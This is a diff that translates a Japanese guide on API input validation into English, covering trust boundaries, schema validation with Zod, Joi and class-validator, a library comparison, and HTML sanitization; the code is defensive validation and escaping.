@@ -1,175 +1,176 @@
-# 入力バリデーション
+# Input Validation
 
-> 入力バリデーションはAPIセキュリティの最前線である。Zod・Joi・class-validatorによる型安全なバリデーション、JSON Schema、サニタイゼーション、SQLインジェクション対策、一般的な攻撃パターンへの防御まで、信頼境界での入力検証の全技法を体系的に解説する。
+> Input validation is the first line of defense in API security. This guide systematically covers type-safe validation with Zod, Joi, and class-validator; JSON Schema; sanitization; SQL injection prevention; and defense against common attack patterns — everything you need for thorough input verification at trust boundaries.
 
-## この章で学ぶこと
+## What You Will Learn
 
-- [ ] バリデーションの設計原則と信頼境界モデルを理解する
-- [ ] Zod・Joi・class-validator の特性と使い分けを把握する
-- [ ] サニタイゼーションとエスケープの正しい適用方法を学ぶ
-- [ ] SQLインジェクション・XSS・Mass Assignmentなど主要攻撃への防御を実装できる
-- [ ] バリデーションエラーレスポンスの設計原則を習得する
-- [ ] 本番環境で頻出するエッジケースへの対処を理解する
-
----
-
-## 前提知識
-
-- API認証パターンの理解 → 参照: [認証パターン](./00-authentication-patterns.md)
-- レート制限の概念 → 参照: [レート制限](./01-rate-limiting.md)
-- SQLインジェクション・XSSなどのセキュリティ脅威 → 参照: セキュリティ基礎
+- [ ] Understand validation design principles and the trust boundary model
+- [ ] Learn the characteristics and appropriate use cases for Zod, Joi, and class-validator
+- [ ] Learn the correct application of sanitization and escaping
+- [ ] Implement defenses against major attacks such as SQL injection, XSS, and Mass Assignment
+- [ ] Master the design principles for validation error responses
+- [ ] Understand how to handle edge cases that frequently appear in production environments
 
 ---
 
-## 1. バリデーションの原則と信頼境界モデル
+## Prerequisites
 
-### 1.1 信頼境界とは何か
+- Understanding of API authentication patterns → See: [Authentication Patterns](./00-authentication-patterns.md)
+- Concepts of rate limiting → See: [Rate Limiting](./01-rate-limiting.md)
+- Security threats such as SQL injection and XSS → See: Security Fundamentals
 
-信頼境界（Trust Boundary）とは、システム内部と外部を隔てる論理的な境界線である。この境界を超えて流入するすべてのデータは、悪意を持つ可能性があるものとして扱わなければならない。
+---
+
+## 1. Validation Principles and the Trust Boundary Model
+
+### 1.1 What Is a Trust Boundary?
+
+A trust boundary is a logical boundary that separates the inside of a system from the outside. All data flowing in across this boundary must be treated as potentially malicious.
 
 ```
 +=====================================================================+
-|                    信頼境界モデル（Trust Boundary Model）              |
+|                    Trust Boundary Model                             |
 +=====================================================================+
 |                                                                     |
-|  外部（信頼できない領域）              信頼境界          内部（信頼できる領域）  |
+|  External (Untrusted Zone)          Trust Boundary  Internal (Trusted Zone)  |
 |  +--------------------------+    |  +--------------------------+    |
-|  |  ブラウザ / モバイルアプリ   |    |  |                          |    |
-|  |  ・リクエストボディ         | ──>|  |  バリデーション層           |    |
-|  |  ・クエリパラメータ         |    |  |  ┌──────────────┐       |    |
-|  |  ・パスパラメータ          |    |  |  │ 型チェック      │       |    |
-|  |  ・HTTPヘッダー           |    |  |  │ 形式チェック     │       |    |
-|  |  ・Cookie               |    |  |  │ 範囲チェック     │       |    |
-|  |  ・ファイルアップロード     |    |  |  │ パターン検証     │       |    |
-|  +--------------------------+    |  |  │ ビジネスルール    │       |    |
-|                                  |  |  │ サニタイゼーション │       |    |
+|  |  Browser / Mobile App    |    |  |                          |    |
+|  |  · Request Body          | ──>|  |  Validation Layer        |    |
+|  |  · Query Parameters      |    |  |  ┌──────────────┐       |    |
+|  |  · Path Parameters       |    |  |  │ Type Check    │       |    |
+|  |  · HTTP Headers          |    |  |  │ Format Check  │       |    |
+|  |  · Cookie                |    |  |  │ Range Check   │       |    |
+|  |  · File Upload           |    |  |  │ Pattern Check │       |    |
+|  +--------------------------+    |  |  │ Business Rules│       |    |
+|                                  |  |  │ Sanitization  │       |    |
 |  +--------------------------+    |  |  └──────────────┘       |    |
-|  |  外部API / Webhook       | ──>|  |       │                    |    |
-|  |  ・レスポンスボディ        |    |  |       v                    |    |
-|  |  ・ヘッダー値             |    |  |  ビジネスロジック層          |    |
+|  |  External API / Webhook  | ──>|  |       │                    |    |
+|  |  · Response Body         |    |  |       v                    |    |
+|  |  · Header Values         |    |  |  Business Logic Layer     |    |
 |  +--------------------------+    |  |       │                    |    |
 |                                  |  |       v                    |    |
-|  +--------------------------+    |  |  データアクセス層            |    |
-|  |  DBからの読み取りデータ     | ──>|  |  （パラメタライズドクエリ）    |    |
-|  |  ※過去に不正データが        |    |  +--------------------------+    |
-|  |    保存されている可能性     |    |                                  |
+|  +--------------------------+    |  |  Data Access Layer        |    |
+|  |  Data Read From DB       | ──>|  |  (Parameterized Queries)  |    |
+|  |  * Previously saved      |    |  +--------------------------+    |
+|  |    malicious data risk   |    |                                  |
 |  +--------------------------+    |                                  |
 |                                                                     |
 +=====================================================================+
 ```
 
-### 1.2 信頼できない入力の全一覧
+### 1.2 Complete List of Untrusted Inputs
 
-APIが受け取るあらゆるデータソースについて、信頼レベルを明確に分類する。
+Clearly classify the trust level of every data source an API receives.
 
-| データソース | 信頼レベル | バリデーション要否 | 補足 |
-|-------------|-----------|-----------------|------|
-| リクエストボディ（JSON/XML/Form） | 信頼できない | 必須 | 最も攻撃対象になる |
-| クエリパラメータ | 信頼できない | 必須 | URL に含まれるため改ざん容易 |
-| パスパラメータ | 信頼できない | 必須 | UUID/ID 形式の検証が必要 |
-| HTTP ヘッダー | 信頼できない | 必須 | Authorization, Content-Type など |
-| Cookie | 信頼できない | 必須 | JWT トークンの署名検証が必要 |
-| ファイルアップロード | 信頼できない | 必須 | MIME タイプ偽装に注意 |
-| 外部 API レスポンス | 条件付き信頼 | 推奨 | スキーマ変更に対する防御 |
-| DB からの既存データ | 条件付き信頼 | 推奨 | 過去の不正データ混入リスク |
-| 環境変数 | 内部信頼 | 起動時検証 | 起動時にスキーマ検証すべき |
+| Data Source | Trust Level | Validation Required | Notes |
+|-------------|-------------|---------------------|-------|
+| Request Body (JSON/XML/Form) | Untrusted | Required | Most targeted by attacks |
+| Query Parameters | Untrusted | Required | Easily tampered since they appear in URLs |
+| Path Parameters | Untrusted | Required | UUID/ID format verification needed |
+| HTTP Headers | Untrusted | Required | Authorization, Content-Type, etc. |
+| Cookie | Untrusted | Required | JWT token signature verification required |
+| File Upload | Untrusted | Required | Beware of MIME type spoofing |
+| External API Response | Conditionally trusted | Recommended | Defense against schema changes |
+| Existing DB Data | Conditionally trusted | Recommended | Risk of previously injected malicious data |
+| Environment Variables | Internally trusted | Validate at startup | Should be schema-validated at startup |
 
-### 1.3 バリデーションの6つの段階
+### 1.3 The 6 Stages of Validation
 
-バリデーションは単なる「型チェック」ではなく、6つの段階を持つ多層防御である。
+Validation is not merely a "type check" — it is a multi-layered defense with 6 stages.
 
 ```
 +===========================================================+
-|              バリデーションの6段階ピラミッド                    |
+|              6-Stage Validation Pyramid                    |
 +===========================================================+
 |                                                           |
 |                    ┌─────────┐                            |
-|                    │ ⑥ 関連  │  開始日 < 終了日            |
-|                    │  チェック │  合計金額 = 明細合計         |
+|                    │ ⑥ Cross │  startDate < endDate       |
+|                    │  Check  │  total = sum of line items  |
 |                   ┌┴─────────┴┐                           |
-|                   │ ⑤ ビジネス │  在庫数 > 0               |
-|                   │  ルール    │  年齢 >= 18               |
+|                   │ ⑤ Business│  stock > 0               |
+|                   │  Rules    │  age >= 18                |
 |                  ┌┴───────────┴┐                          |
-|                  │ ④ パターン   │  正規表現による検証         |
-|                  │  チェック    │  電話番号, 郵便番号         |
+|                  │ ④ Pattern   │  Regex-based validation   |
+|                  │  Check      │  phone number, postal code|
 |                 ┌┴─────────────┴┐                         |
-|                 │ ③ 範囲チェック  │  min, max, minLength    |
+|                 │ ③ Range Check  │  min, max, minLength    |
 |                 │               │  maxLength, enum         |
 |                ┌┴───────────────┴┐                        |
-|                │ ② 形式チェック    │  email, URL, UUID       |
-|                │                 │  ISO 8601 日時           |
+|                │ ② Format Check  │  email, URL, UUID       |
+|                │                 │  ISO 8601 datetime      |
 |               ┌┴─────────────────┴┐                       |
-|               │ ① 型チェック        │  string, number        |
-|               │                   │  boolean, array, object │
+|               │ ① Type Check      │  string, number        |
+|               │                   │  boolean, array, object│
 |               └───────────────────┘                       |
 |                                                           |
-|  ※ 下層ほど基本的で、上層ほどドメイン固有                       |
-|  ※ 各段階を順に通過させることで安全性を積み上げる                 |
+|  * Lower layers are more fundamental; upper layers are    |
+|    more domain-specific                                   |
+|  * Passing each stage in order builds up security         |
 +===========================================================+
 ```
 
-### 1.4 バリデーション設計の4原則
+### 1.4 The 4 Principles of Validation Design
 
-**原則1: Fail Fast（早期失敗）**
+**Principle 1: Fail Fast**
 
-バリデーションエラーはできるだけ早い段階で検出し、処理を中断する。ビジネスロジック層やデータアクセス層まで不正データを到達させてはならない。
+Detect validation errors as early as possible and abort processing. Never allow invalid data to reach the business logic layer or data access layer.
 
-**原則2: Collect All Errors（全エラー収集）**
+**Principle 2: Collect All Errors**
 
-ユーザー体験の観点から、エラーは1つずつ返すのではなく、検出されたすべてのエラーをまとめて返す。これにより、クライアント側で一度にすべての修正が可能になる。
+From a user experience perspective, return all detected errors at once rather than one at a time. This allows the client to correct all issues in a single pass.
 
-**原則3: Specific Error Messages（具体的エラーメッセージ）**
+**Principle 3: Specific Error Messages**
 
-「入力が不正です」のような曖昧なメッセージではなく、「メールアドレスの形式が正しくありません」のように具体的な内容を伝える。ただし、内部実装の詳細は漏洩させない。
+Instead of vague messages like "Input is invalid," convey specific content such as "The email address format is incorrect." However, do not expose internal implementation details.
 
-**原則4: Whitelist over Blacklist（ホワイトリスト優先）**
+**Principle 4: Whitelist over Blacklist**
 
-「禁止する文字を列挙する」のではなく、「許可する文字を明示的に定義する」アプローチを取る。ブラックリストは攻撃パターンの進化に追従できないためである。
+Rather than "enumerating prohibited characters," take the approach of "explicitly defining allowed characters." Blacklists cannot keep up with evolving attack patterns.
 
 ---
 
-## 2. Zod によるバリデーション
+## 2. Validation with Zod
 
-### 2.1 Zod の基本概念
+### 2.1 Core Concepts of Zod
 
-Zod は TypeScript-first のスキーマバリデーションライブラリである。スキーマ定義から TypeScript の型を自動推論できることが最大の特長であり、バリデーションスキーマと型定義の二重管理を解消できる。
+Zod is a TypeScript-first schema validation library. Its greatest strength is the ability to automatically infer TypeScript types from schema definitions, eliminating the dual maintenance of validation schemas and type definitions.
 
 ```typescript
 // ============================================================
-// コード例1: Zod の基本スキーマ定義とバリデーション
+// Code Example 1: Zod Basic Schema Definition and Validation
 // ============================================================
 import { z } from 'zod';
 
-// --- ユーザー作成スキーマ ---
+// --- User creation schema ---
 const CreateUserSchema = z.object({
-  // 文字列フィールド: trim() で前後の空白を除去
+  // String field: trim() removes leading and trailing whitespace
   name: z.string()
     .min(1, 'Name is required')
     .max(100, 'Name must be 100 characters or less')
     .trim(),
 
-  // メールアドレス: 組み込みの email バリデータ + 小文字変換
+  // Email address: built-in email validator + lowercase conversion
   email: z.string()
     .email('Invalid email format')
     .toLowerCase(),
 
-  // 数値フィールド: optional で省略可能に
+  // Numeric field: optional makes it omittable
   age: z.number()
     .int('Age must be an integer')
     .min(0, 'Age must be non-negative')
     .max(150, 'Age must be 150 or less')
     .optional(),
 
-  // 列挙型: 許可値を明示的に定義
+  // Enum: explicitly define allowed values
   role: z.enum(['user', 'admin', 'editor'])
     .default('user'),
 
-  // 配列: 要素の型と配列サイズを同時に制約
+  // Array: constrain element type and array size simultaneously
   tags: z.array(z.string().max(50))
     .max(10, 'Maximum 10 tags')
     .default([]),
 
-  // ネストしたオブジェクト
+  // Nested object
   address: z.object({
     street: z.string().min(1),
     city: z.string().min(1),
@@ -177,9 +178,9 @@ const CreateUserSchema = z.object({
   }).optional(),
 });
 
-// 型の自動推論: スキーマから TypeScript 型を生成
+// Automatic type inference: generate TypeScript type from schema
 type CreateUserInput = z.infer<typeof CreateUserSchema>;
-// 推論結果:
+// Inferred result:
 // {
 //   name: string;
 //   email: string;
@@ -189,12 +190,12 @@ type CreateUserInput = z.infer<typeof CreateUserSchema>;
 //   address?: { street: string; city: string; postalCode: string };
 // }
 
-// --- バリデーション実行（安全な方法） ---
+// --- Validation execution (safe method) ---
 function validateInput<T>(schema: z.ZodSchema<T>, data: unknown) {
   const result = schema.safeParse(data);
 
   if (!result.success) {
-    // Zod のエラー情報を API レスポンス形式に変換
+    // Convert Zod error info to API response format
     const errors = result.error.issues.map(issue => ({
       field: issue.path.join('.'),
       message: issue.message,
@@ -206,7 +207,7 @@ function validateInput<T>(schema: z.ZodSchema<T>, data: unknown) {
   return { success: true as const, data: result.data };
 }
 
-// --- 使用例 ---
+// --- Usage example ---
 const input = {
   name: '  Tanaka Taro  ',
   email: 'Tanaka@Example.COM',
@@ -219,20 +220,20 @@ if (result.success) {
   console.log(result.data);
   // { name: 'Tanaka Taro', email: 'tanaka@example.com', age: 25,
   //   role: 'user', tags: ['developer', 'typescript'] }
-  // ※ trim() と toLowerCase() が自動適用されている
+  // * trim() and toLowerCase() are applied automatically
 }
 ```
 
-### 2.2 Express ミドルウェアとしての統合
+### 2.2 Integration as an Express Middleware
 
 ```typescript
 // ============================================================
-// コード例2: Express バリデーションミドルウェア（汎用設計）
+// Code Example 2: Express Validation Middleware (Generic Design)
 // ============================================================
 import { z, ZodSchema } from 'zod';
 import { Request, Response, NextFunction } from 'express';
 
-// バリデーション対象を指定可能な汎用ミドルウェア
+// Generic middleware that can specify what to validate
 interface ValidateOptions {
   body?: ZodSchema;
   query?: ZodSchema;
@@ -248,7 +249,7 @@ function validate(schemas: ValidateOptions) {
       message: string;
     }> = [];
 
-    // body のバリデーション
+    // Validate body
     if (schemas.body) {
       const result = schemas.body.safeParse(req.body);
       if (!result.success) {
@@ -261,11 +262,11 @@ function validate(schemas: ValidateOptions) {
           });
         });
       } else {
-        req.body = result.data; // バリデーション済みデータで上書き
+        req.body = result.data; // Overwrite with validated data
       }
     }
 
-    // query のバリデーション
+    // Validate query
     if (schemas.query) {
       const result = schemas.query.safeParse(req.query);
       if (!result.success) {
@@ -282,7 +283,7 @@ function validate(schemas: ValidateOptions) {
       }
     }
 
-    // params のバリデーション
+    // Validate params
     if (schemas.params) {
       const result = schemas.params.safeParse(req.params);
       if (!result.success) {
@@ -299,7 +300,7 @@ function validate(schemas: ValidateOptions) {
       }
     }
 
-    // エラーがあれば RFC 7807 形式で返す
+    // Return RFC 7807 format if there are errors
     if (allErrors.length > 0) {
       return res.status(422).json({
         type: 'https://api.example.com/errors/validation',
@@ -314,9 +315,9 @@ function validate(schemas: ValidateOptions) {
   };
 }
 
-// --- ルーティングでの使用 ---
+// --- Usage in routing ---
 
-// ユーザー一覧取得: クエリパラメータのバリデーション
+// Get user list: query parameter validation
 const PaginationSchema = z.object({
   page: z.coerce.number().int().min(1).default(1),
   perPage: z.coerce.number().int().min(1).max(100).default(20),
@@ -333,7 +334,7 @@ app.get('/api/v1/users',
   }
 );
 
-// ユーザー作成: ボディのバリデーション
+// Create user: body validation
 app.post('/api/v1/users',
   validate({ body: CreateUserSchema }),
   async (req, res) => {
@@ -342,7 +343,7 @@ app.post('/api/v1/users',
   }
 );
 
-// ユーザー取得: パスパラメータのバリデーション
+// Get user: path parameter validation
 const UserIdParamsSchema = z.object({
   userId: z.string().uuid('Invalid user ID format'),
 });
@@ -357,14 +358,14 @@ app.get('/api/v1/users/:userId',
 );
 ```
 
-### 2.3 高度なバリデーションパターン
+### 2.3 Advanced Validation Patterns
 
 ```typescript
 // ============================================================
-// コード例3: Zod の高度なバリデーション機能
+// Code Example 3: Advanced Zod Validation Features
 // ============================================================
 
-// --- カスタムバリデーション: パスワード強度 ---
+// --- Custom validation: password strength ---
 const PasswordSchema = z.string()
   .min(8, 'Password must be at least 8 characters')
   .max(128, 'Password must be 128 characters or less')
@@ -385,7 +386,7 @@ const PasswordSchema = z.string()
     'Password must contain at least one special character'
   );
 
-// --- 相互依存バリデーション: 日付範囲 ---
+// --- Cross-field validation: date range ---
 const DateRangeSchema = z.object({
   startDate: z.string().datetime(),
   endDate: z.string().datetime(),
@@ -401,7 +402,7 @@ const DateRangeSchema = z.object({
   { message: 'Date range must not exceed 365 days', path: ['endDate'] }
 );
 
-// --- discriminatedUnion: 条件分岐バリデーション ---
+// --- discriminatedUnion: conditional validation ---
 const NotificationSchema = z.discriminatedUnion('type', [
   z.object({
     type: z.literal('email'),
@@ -422,7 +423,7 @@ const NotificationSchema = z.discriminatedUnion('type', [
   }),
 ]);
 
-// --- transform: バリデーション後のデータ変換 ---
+// --- transform: data transformation after validation ---
 const SearchQuerySchema = z.object({
   q: z.string()
     .min(1)
@@ -446,7 +447,7 @@ const SearchQuerySchema = z.object({
   { message: 'minPrice must be less than or equal to maxPrice', path: ['minPrice'] }
 );
 
-// --- preprocess: 入力の前処理 ---
+// --- preprocess: pre-processing input ---
 const FlexibleDateSchema = z.preprocess(
   (val) => {
     if (typeof val === 'string') return new Date(val);
@@ -456,7 +457,7 @@ const FlexibleDateSchema = z.preprocess(
   z.date().min(new Date('2000-01-01')).max(new Date('2100-12-31'))
 );
 
-// --- recursive: 再帰的スキーマ ---
+// --- recursive: recursive schema ---
 interface Category {
   name: string;
   children: Category[];
@@ -469,11 +470,11 @@ const CategorySchema: z.ZodType<Category> = z.lazy(() =>
   })
 );
 
-// --- strict モード: 未定義フィールドの拒否 ---
+// --- strict mode: reject undefined fields ---
 const StrictUserSchema = z.object({
   name: z.string(),
   email: z.string().email(),
-}).strict(); // role, isAdmin 等の余計なフィールドを拒否
+}).strict(); // Reject extra fields like role, isAdmin, etc.
 
 // StrictUserSchema.parse({ name: 'Taro', email: 'taro@example.com', role: 'admin' })
 // -> ZodError: Unrecognized key(s) in object: 'role'
@@ -481,19 +482,19 @@ const StrictUserSchema = z.object({
 
 ---
 
-## 3. Joi によるバリデーション
+## 3. Validation with Joi
 
-### 3.1 Joi の特長と基本使用法
+### 3.1 Features and Basic Usage of Joi
 
-Joi は Node.js エコシステムで最も歴史のあるバリデーションライブラリの1つであり、hapi フレームワークから独立して発展した。豊富な組み込みバリデータと分かりやすい API が特長である。
+Joi is one of the most established validation libraries in the Node.js ecosystem, having evolved independently from the hapi framework. Its strengths are a rich set of built-in validators and an intuitive API.
 
 ```typescript
 // ============================================================
-// コード例4: Joi によるスキーマ定義とバリデーション
+// Code Example 4: Schema Definition and Validation with Joi
 // ============================================================
 import Joi from 'joi';
 
-// --- ユーザー作成スキーマ ---
+// --- User creation schema ---
 const createUserSchema = Joi.object({
   name: Joi.string()
     .min(1)
@@ -501,8 +502,8 @@ const createUserSchema = Joi.object({
     .trim()
     .required()
     .messages({
-      'string.empty': '名前は必須です',
-      'string.max': '名前は100文字以内で入力してください',
+      'string.empty': 'Name is required',
+      'string.max': 'Name must be 100 characters or less',
     }),
 
   email: Joi.string()
@@ -510,7 +511,7 @@ const createUserSchema = Joi.object({
     .lowercase()
     .required()
     .messages({
-      'string.email': '有効なメールアドレスを入力してください',
+      'string.email': 'Please enter a valid email address',
     }),
 
   age: Joi.number()
@@ -540,7 +541,7 @@ const createUserSchema = Joi.object({
     .valid(Joi.ref('password'))
     .required()
     .messages({
-      'any.only': 'パスワード確認が一致しません',
+      'any.only': 'Password confirmation does not match',
     }),
 
   address: Joi.object({
@@ -551,11 +552,11 @@ const createUserSchema = Joi.object({
       .required(),
   }).optional(),
 }).options({
-  abortEarly: false,  // 全エラーを収集（1つ目で中断しない）
-  stripUnknown: true,  // 未定義フィールドを除去
+  abortEarly: false,  // Collect all errors (do not stop at first)
+  stripUnknown: true,  // Remove undefined fields
 });
 
-// --- バリデーション実行 ---
+// --- Validation execution ---
 function validateWithJoi<T>(
   schema: Joi.ObjectSchema<T>,
   data: unknown
@@ -577,13 +578,13 @@ function validateWithJoi<T>(
   return { success: true, data: value as T };
 }
 
-// --- 条件分岐バリデーション（when） ---
+// --- Conditional validation (when) ---
 const paymentSchema = Joi.object({
   method: Joi.string()
     .valid('credit_card', 'bank_transfer', 'convenience')
     .required(),
 
-  // method が credit_card の場合のみ必須
+  // Required only when method is credit_card
   cardNumber: Joi.string()
     .creditCard()
     .when('method', {
@@ -600,7 +601,7 @@ const paymentSchema = Joi.object({
       otherwise: Joi.forbidden(),
     }),
 
-  // method が bank_transfer の場合のみ必須
+  // Required only when method is bank_transfer
   bankCode: Joi.string()
     .pattern(/^\d{4}$/)
     .when('method', {
@@ -618,7 +619,7 @@ const paymentSchema = Joi.object({
     }),
 });
 
-// --- Express ミドルウェア ---
+// --- Express middleware ---
 function joiValidate(schema: Joi.ObjectSchema) {
   return (req: Request, res: Response, next: NextFunction) => {
     const { error, value } = schema.validate(req.body, {
@@ -647,15 +648,15 @@ function joiValidate(schema: Joi.ObjectSchema) {
 
 ---
 
-## 4. class-validator によるバリデーション
+## 4. Validation with class-validator
 
-### 4.1 class-validator の特長
+### 4.1 Features of class-validator
 
-class-validator はデコレータベースのバリデーションライブラリであり、NestJS のデフォルトバリデーションソリューションとして広く採用されている。クラスベースの OOP スタイルに適合し、class-transformer と組み合わせることでリクエストの自動変換・検証が可能になる。
+class-validator is a decorator-based validation library widely adopted as the default validation solution in NestJS. It fits a class-based OOP style and, combined with class-transformer, enables automatic transformation and validation of requests.
 
 ```typescript
 // ============================================================
-// コード例5: class-validator + class-transformer によるバリデーション
+// Code Example 5: Validation with class-validator + class-transformer
 // ============================================================
 import {
   IsString, IsEmail, IsInt, Min, Max, IsOptional,
@@ -665,7 +666,7 @@ import {
 } from 'class-validator';
 import { Type, Transform, plainToInstance } from 'class-transformer';
 
-// カスタムバリデータデコレータ
+// Custom validator decorator
 function IsStrongPassword(validationOptions?: ValidationOptions) {
   return function (object: Object, propertyName: string) {
     registerDecorator({
@@ -691,7 +692,7 @@ function IsStrongPassword(validationOptions?: ValidationOptions) {
   };
 }
 
-// --- DTO（Data Transfer Object）定義 ---
+// --- DTO (Data Transfer Object) definition ---
 class AddressDto {
   @IsString()
   @MinLength(1)
@@ -747,29 +748,29 @@ class CreateUserDto {
   password: string;
 }
 
-// --- NestJS での使用例 ---
-// NestJS は ValidationPipe を通じて class-validator を自動実行する
+// --- Usage in NestJS ---
+// NestJS automatically runs class-validator through ValidationPipe
 //
 // @Controller('users')
 // export class UsersController {
 //   @Post()
 //   async create(@Body() dto: CreateUserDto) {
-//     // dto は既にバリデーション済み
+//     // dto is already validated
 //     return this.usersService.create(dto);
 //   }
 // }
 //
 // // main.ts
 // app.useGlobalPipes(new ValidationPipe({
-//   whitelist: true,        // DTO に定義されていないプロパティを除去
-//   forbidNonWhitelisted: true,  // 未定義プロパティがあればエラー
-//   transform: true,        // plainToInstance を自動実行
+//   whitelist: true,        // Remove properties not defined in the DTO
+//   forbidNonWhitelisted: true,  // Error if undefined properties are present
+//   transform: true,        // Automatically run plainToInstance
 //   transformOptions: {
 //     enableImplicitConversion: true,
 //   },
 // }));
 
-// --- 手動でのバリデーション実行 ---
+// --- Manual validation execution ---
 import { validate } from 'class-validator';
 
 async function validateDto<T extends object>(
@@ -798,90 +799,91 @@ async function validateDto<T extends object>(
 
 ---
 
-## 5. バリデーションライブラリ比較
+## 5. Validation Library Comparison
 
-### 5.1 Zod vs Joi vs class-validator 総合比較表
+### 5.1 Comprehensive Comparison: Zod vs Joi vs class-validator
 
-| 比較項目 | Zod | Joi | class-validator |
-|---------|-----|-----|-----------------|
-| 設計思想 | TypeScript-first, 関数型 | JavaScript-first, メソッドチェーン | デコレータベース, OOP |
-| TypeScript 型推論 | z.infer で自動推論 | 別途型定義が必要 | クラス定義から推論 |
-| バンドルサイズ | 約 13KB (gzip) | 約 45KB (gzip) | 約 20KB (gzip) |
-| Tree Shaking | 対応 | 非対応 | 部分対応 |
-| 非同期バリデーション | refine で対応 | external で対応 | カスタムデコレータで対応 |
-| 条件分岐 | discriminatedUnion | when | ValidateIf |
-| エラーメッセージ | カスタマイズ可 | messages() で詳細設定 | message オプション |
-| 変換（Transform） | transform() | 自動変換あり | class-transformer |
-| 再帰的スキーマ | z.lazy() | Joi.link() | ValidateNested |
-| フレームワーク連携 | 汎用（どこでも使用可） | hapi と親和性高 | NestJS のデフォルト |
-| 学習コスト | 低い | 中程度 | 中程度（デコレータ理解要） |
-| npm 週間DL数 | 約 800万 (2025年) | 約 600万 (2025年) | 約 400万 (2025年) |
-| 主要採用先 | tRPC, Next.js | hapi, Express | NestJS |
+| Comparison Item | Zod | Joi | class-validator |
+|-----------------|-----|-----|-----------------|
+| Design Philosophy | TypeScript-first, functional | JavaScript-first, method chaining | Decorator-based, OOP |
+| TypeScript Type Inference | Auto-inferred via z.infer | Requires separate type definitions | Inferred from class definition |
+| Bundle Size | ~13KB (gzip) | ~45KB (gzip) | ~20KB (gzip) |
+| Tree Shaking | Supported | Not supported | Partial support |
+| Async Validation | Supported via refine | Supported via external | Supported via custom decorators |
+| Conditional Branching | discriminatedUnion | when | ValidateIf |
+| Error Messages | Customizable | Detailed via messages() | message option |
+| Transformation | transform() | Auto-transform available | class-transformer |
+| Recursive Schema | z.lazy() | Joi.link() | ValidateNested |
+| Framework Integration | Universal (works anywhere) | High affinity with hapi | Default in NestJS |
+| Learning Curve | Low | Moderate | Moderate (requires understanding decorators) |
+| npm Weekly Downloads | ~8 million (2025) | ~6 million (2025) | ~4 million (2025) |
+| Major Adopters | tRPC, Next.js | hapi, Express | NestJS |
 
-### 5.2 使い分けガイドライン
+### 5.2 Selection Guidelines
 
 ```
 +===============================================================+
-|             バリデーションライブラリ選定フローチャート               |
+|         Validation Library Selection Flowchart               |
 +===============================================================+
 |                                                               |
-|  Q1: フレームワークは何か?                                      |
-|  ├─ NestJS ──────────> class-validator (推奨)                  |
-|  ├─ hapi ────────────> Joi (推奨)                              |
-|  └─ その他 ──> Q2へ                                            |
+|  Q1: What is the framework?                                   |
+|  ├─ NestJS ──────────> class-validator (recommended)         |
+|  ├─ hapi ────────────> Joi (recommended)                      |
+|  └─ Other ──> Go to Q2                                        |
 |                                                               |
-|  Q2: TypeScript を使用しているか?                               |
-|  ├─ Yes ──> Q3へ                                               |
-|  └─ No ───────────────> Joi (JavaScript でも使いやすい)         |
+|  Q2: Are you using TypeScript?                                |
+|  ├─ Yes ──> Go to Q3                                          |
+|  └─ No ───────────────> Joi (easy to use in JavaScript)       |
 |                                                               |
-|  Q3: 型推論の自動化を重視するか?                                 |
-|  ├─ Yes ──────────────> Zod (型とスキーマの一元管理)             |
-|  └─ No ───────────────> いずれも可                              |
+|  Q3: Do you prioritize automatic type inference?              |
+|  ├─ Yes ──────────────> Zod (unified management of types      |
+|  │                           and schemas)                     |
+|  └─ No ───────────────> Either is fine                        |
 |                                                               |
-|  Q4: バンドルサイズを重視するか?                                 |
-|  ├─ Yes ──────────────> Zod (最軽量)                            |
-|  └─ No ───────────────> 機能要件で判断                          |
+|  Q4: Do you prioritize bundle size?                           |
+|  ├─ Yes ──────────────> Zod (lightest)                        |
+|  └─ No ───────────────> Decide based on feature requirements  |
 |                                                               |
 +===============================================================+
 ```
 
 ---
 
-## 6. サニタイゼーション
+## 6. Sanitization
 
-### 6.1 サニタイゼーションの原則
+### 6.1 Principles of Sanitization
 
-サニタイゼーション（無害化）とは、入力データから潜在的に危険な要素を除去または変換する処理である。バリデーション（検証）とは異なり、データを「拒否」するのではなく「安全な形に変換」する点が特徴である。
+Sanitization (neutralization) is the process of removing or transforming potentially dangerous elements from input data. Unlike validation (verification), its characteristic is that it "converts data into a safe form" rather than "rejecting" it.
 
-重要な原則として、サニタイゼーションは「入力時」と「出力時」の両方で行う必要がある。
+An important principle is that sanitization must be applied at both input time and output time.
 
 ```
 +===============================================================+
-|              サニタイゼーションの適用ポイント                      |
+|              Sanitization Application Points                  |
 +===============================================================+
 |                                                               |
-|  [入力時サニタイゼーション]                                      |
-|  ・前後の空白除去 (trim)                                        |
-|  ・大文字/小文字の統一                                           |
-|  ・制御文字の除去                                                |
-|  ・Unicode の正規化 (NFC/NFKC)                                  |
-|  ・NULL バイトの除去                                             |
+|  [Input-Time Sanitization]                                    |
+|  · Remove leading/trailing whitespace (trim)                  |
+|  · Normalize case (uppercase/lowercase)                       |
+|  · Remove control characters                                  |
+|  · Unicode normalization (NFC/NFKC)                           |
+|  · Remove NULL bytes                                          |
 |                                                               |
-|  [出力時サニタイゼーション]                                      |
-|  ・HTML エスケープ（ブラウザへの出力時）                           |
-|  ・SQL パラメータバインド（DB クエリ時）                           |
-|  ・URL エンコード（URL への埋め込み時）                            |
-|  ・JSON エスケープ（JSON レスポンス時）                            |
+|  [Output-Time Sanitization]                                   |
+|  · HTML escaping (when outputting to browser)                 |
+|  · SQL parameter binding (when executing DB queries)          |
+|  · URL encoding (when embedding in URLs)                      |
+|  · JSON escaping (when generating JSON responses)             |
 |                                                               |
-|  ※ 保存時のデータは可能な限り「生データ」で保持し、                  |
-|    出力先のコンテキストに応じてエスケープする                       |
+|  * Store data as "raw data" wherever possible, and escape     |
+|    according to the output context                            |
 +===============================================================+
 ```
 
-### 6.2 HTML エスケープの実装
+### 6.2 Implementing HTML Escaping
 
 ```typescript
-// HTML エスケープ（XSS 対策の基本）
+// HTML escaping (fundamental XSS countermeasure)
 function escapeHtml(str: string): string {
   const map: Record<string, string> = {
     '&': '&amp;',
@@ -894,7 +896,7 @@ function escapeHtml(str: string): string {
   return str.replace(/[&<>"'/]/g, (c) => map[c]);
 }
 
-// DOMPurify を使った高度なサニタイゼーション（サーバーサイド）
+// Advanced sanitization using DOMPurify (server-side)
 import createDOMPurify from 'dompurify';
 import { JSDOM } from 'jsdom';
 
@@ -908,7 +910,7 @@ function sanitizeHtml(dirty: string): string {
   });
 }
 
-// Zod の transform でサニタイズを統合
+// Integrate sanitization with Zod transform
 const CommentSchema = z.object({
   content: z.string()
     .min(1, 'Comment is required')
@@ -922,26 +924,26 @@ const CommentSchema = z.object({
 });
 ```
